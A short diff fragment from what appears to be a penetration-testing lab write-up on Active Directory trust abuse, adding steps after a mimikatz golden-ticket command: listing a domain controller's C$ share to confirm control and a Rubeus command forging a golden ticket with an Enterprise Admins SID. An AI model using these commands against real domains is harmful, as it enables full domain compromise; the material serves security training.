@@ -47,4 +47,14 @@ kerberos::golden /user:NJohn /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21
 
 We then use klist to confirm the existence of the crafted golden ticket in our current session
 
-If the ticket exist, we then have complete control ove
+If the ticket exist, we then have complete control over the parent domain, we can try listing domain controller C drive to validate, or we can proceed to perform a DCSync Attack:
+```
+#Example
+ls \\academy-ea-dc01.inlanefreight.local\c$
+```
+
+Lastly, we can perform this attack by using rubeus as well
+
+```
+.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<domainfqdn> /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+```
